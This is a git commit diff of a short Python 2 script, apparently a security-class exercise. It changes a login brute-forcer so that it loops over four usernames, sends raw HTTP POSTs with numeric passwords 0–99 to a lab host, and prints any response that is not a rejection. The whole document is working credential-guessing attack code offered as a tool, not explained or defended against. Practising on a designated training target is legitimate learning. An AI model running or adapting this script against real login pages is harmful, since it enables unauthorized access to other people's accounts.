bc8856a1b695d2293311c718d980ab333cb4612c
Ecw0rk <ecwork@gmail.com>
2017-09-17 02:43:01 -0700

    New update

--- Proj_2xa.py
+++ Proj_2xa.py
@@ -2,7 +2,7 @@
 
 import socket
 import bs4
-user = 'sue'
+users = ['bill', 'ted', 'sally', 'sue']
 socket.setdefaulttimeout(2)
 # s = socket.socket()
 
@@ -21,14 +21,16 @@ Accept-Language: en-US,en;q=0.8
 Cookie: __cfduid=defa9068e57cd00aaeaf3eff82897926c1374014337
 
 """
-
-for pw in range(100):
-    s = socket.socket()
-    length = len(user) + len(str(pw)) + 5
-    s.connect(("attackdirect.samsclass.info", 80))
-    s.send(req1 + str(length) + '\n' + req2 + "u=" + user + "&p=" + str(pw) + '\n')
-    html = s.recv(1024)
-    soup = bs4.BeautifulSoup(html, 'html5lib')
-    # print html
-    print pw, soup.select('h1')[0]
-    s.close()
+for user in users:
+    for pw in range(100):
+        s = socket.socket()
+        length = len(user) + len(str(pw)) + 5
+        s.connect(("attackdirect.samsclass.info", 80))
+        s.send(req1 + str(length) + '\n' + req2 + "u=" + user + "&p=" + str(pw) + '\n')
+        html = s.recv(1024)
+        soup = bs4.BeautifulSoup(html, 'html5lib')
+        if soup.select('h1')[0].getText() != 'Credentials rejected!':
+            print soup.select('body')[0]
+            # print soup.select('h1')[0].getText()
+            # print html
+        s.close()
